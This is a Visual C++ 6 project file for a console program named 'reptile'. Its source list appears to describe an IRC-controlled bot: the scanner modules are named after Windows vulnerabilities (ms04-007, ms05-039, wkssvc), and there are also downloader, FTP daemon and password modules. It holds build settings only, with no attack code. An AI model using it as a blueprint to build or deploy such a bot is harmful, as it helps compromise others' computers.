# Microsoft Developer Studio Project File - Name="reptile" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=reptile - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "reptile.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "reptile.mak" CFG="reptile - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "reptile - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE "reptile - Win32 Debug" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe

!IF  "$(CFG)" == "reptile - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MD /W3 /GX /O1 /I "lib/openssl/win32/include" /D "WIN32" /D "_CONSOLE" /D "_MBCS" /D "NDEBUG" /YX /FD /c
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 /nologo /subsystem:console /machine:I386 /out:"Bin/reptile.exe" /libpath:"lib/openssl/win32/lib"
# SUBTRACT LINK32 /incremental:yes

!ELSEIF  "$(CFG)" == "reptile - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /MD /W3 /GX /O1 /I "lib/openssl/win32/include" /D "WIN32" /D "_CONSOLE" /D "_MBCS" /D "_DEBUG" /YX /FD /c
# ADD BASE RSC /l 0x409 /d "_DEBUG"
# ADD RSC /l 0x409 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /debug /machine:I386 /pdbtype:sept
# ADD LINK32 /nologo /subsystem:console /incremental:no /debug /machine:I386 /out:"Bin/reptile-d.exe" /pdbtype:sept /libpath:"lib/openssl/win32/lib"
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "reptile - Win32 Release"
# Name "reptile - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanner source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\fphost.cpp
# End Source File
# Begin Source File

SOURCE=".\ms04-007.cpp"
# End Source File
# Begin Source File

SOURCE=".\ms05-039.cpp"
# End Source File
# Begin Source File

SOURCE=.\wkssvc.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\irc.cpp
# End Source File
# Begin Source File

SOURCE=.\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\netstatp.cpp
# End Source File
# Begin Source File

SOURCE=.\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\protocol.cpp
# End Source File
# Begin Source File

SOURCE=.\regcontrol.cpp
# End Source File
# Begin Source File

SOURCE=.\reptile.cpp
# End Source File
# Begin Source File

SOURCE=.\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\service.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\utility.cpp
# End Source File
# Begin Source File

SOURCE=.\vscan.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "scanner headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=".\ms04-007.h"
# End Source File
# Begin Source File

SOURCE=".\ms05-039.h"
# End Source File
# Begin Source File

SOURCE=.\wkssvc.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\commands.h
# End Source File
# Begin Source File

SOURCE=.\configs.h
# End Source File
# Begin Source File

SOURCE=.\crypt.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\irc.h
# End Source File
# Begin Source File

SOURCE=.\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\netstatp.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\protocol.h
# End Source File
# Begin Source File

SOURCE=.\regcontrol.h
# End Source File
# Begin Source File

SOURCE=.\reptile.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\service.h
# End Source File
# Begin Source File

SOURCE=.\strings.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\utility.h
# End Source File
# Begin Source File

SOURCE=.\vscan.h
# End Source File
# Begin Source File

SOURCE=.\vscandef.h
# End Source File
# End Group
# End Target
# End Project
